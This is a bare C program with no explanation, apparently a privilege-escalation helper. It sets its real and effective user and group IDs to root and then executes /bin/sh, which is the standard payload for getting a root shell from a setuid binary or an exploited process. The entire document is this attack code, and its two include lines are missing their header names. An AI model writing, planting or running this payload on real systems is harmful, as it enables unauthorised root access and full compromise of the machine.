#include
#include
int
main (void)
{
char *shell[2];
shell[0] = "sh";
shell[1] = NULL;
setregid (0, 0);
setreuid (0, 0);
execve ("/bin/sh", shell, NULL);
return(0);
}
